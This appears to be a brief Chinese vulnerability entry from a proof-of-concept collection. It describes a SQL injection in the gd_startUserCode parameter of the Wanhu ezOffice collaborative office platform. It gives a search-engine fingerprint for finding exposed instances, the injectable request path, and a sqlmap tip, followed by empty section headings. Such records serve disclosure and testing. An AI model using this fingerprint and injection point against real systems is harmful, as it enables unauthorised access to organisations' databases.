# 万户协同办公平台ezofficegd_startUserCode存在SQL注入漏洞

- **系统**：万户协同办公平台　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="万户 Ezoffice OA"`

**请求体 / payload**
```
/defaultroot/platform/bpm/ezflow/operation/ezflow_gd.jsp;?gd=1&gd_startUserCode=1
注意：不能使用`--batch`参数，因响应为`404`，`sqlamp`\
```

**其他**
- 万户协同办公平台ezoffice gd\_startUserCode 存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 万户ezoffice